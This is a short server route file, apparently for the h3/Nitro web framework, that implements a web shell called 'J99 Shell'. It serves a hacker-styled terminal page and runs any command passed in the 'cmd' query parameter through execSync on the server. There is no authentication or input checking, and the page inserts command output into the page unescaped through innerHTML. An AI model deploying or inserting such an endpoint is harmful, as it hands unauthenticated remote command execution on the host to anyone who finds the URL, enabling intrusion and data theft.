import { execSync } from 'node:child_process'
import { useQuery } from 'h3'

const htmlTemplate = () => `<!DOCTYPE html>
<html data-head-attrs="">
<head>
  <title># J99 Shell</title>
  <style>
    body { background-color: black; color: green; display: flex; flex-direction: column; }
    input { background: transparent; border: none; color: green; }
    input:focus { outline: none; }
  </style>
</head>
<body>
  <pre id="console"></pre>
  <input autofocus id="cmd" value="# ">
  <script>
    const cmdEl = document.getElementById('cmd')
    const consoleEl = document.getElementById('console')
    function writeLine(str) { consoleEl.innerHTML+= \`<p>\${str}</p>\` }
    async function run(cmd = cmdEl.value.replace(/^#\s*/, '')) {
      cmdEl.value = '# '
      writeLine('# ' + cmd)
      const res = await fetch('?cmd=' + cmd).then(r => r.json()).catch(err => ({ stdout: 'Exec error: ' + err }))
      console.log(res)
      writeLine(res.stdout)
    }
    writeLine(\`
    ██╗ █████╗  █████╗
    ██║██╔══██╗██╔══██╗
    ██║╚██████║╚██████║
██   ██║ ╚═══██║ ╚═══██║
╚█████╔╝ █████╔╝ █████╔╝
╚════╝  ╚════╝  ╚════╝
Welcome to J99 shell!
\`)
    run('uname -a')

document.onkeydown = () => {
  const cmdEl = document.getElementById('cmd')
  cmdEl.setSelectionRange(cmdEl.value.length, cmdEl.value.length)
  cmdEl.focus()
}
cmdEl.onkeydown = (event) => {
  if (event.key === 'Enter') { run() }
  if (cmdEl.value.length < 3) { cmdEl.value = '# ' }
}
  </script>
</body>
</html>`

export default eventHandler(async (event) => {
  const { cmd } = useQuery(event)
  if (!cmd) {
    return htmlTemplate()
  }
  const stdout = execSync(cmd as string).toString('utf8')
  return {
    stdout
  }
})
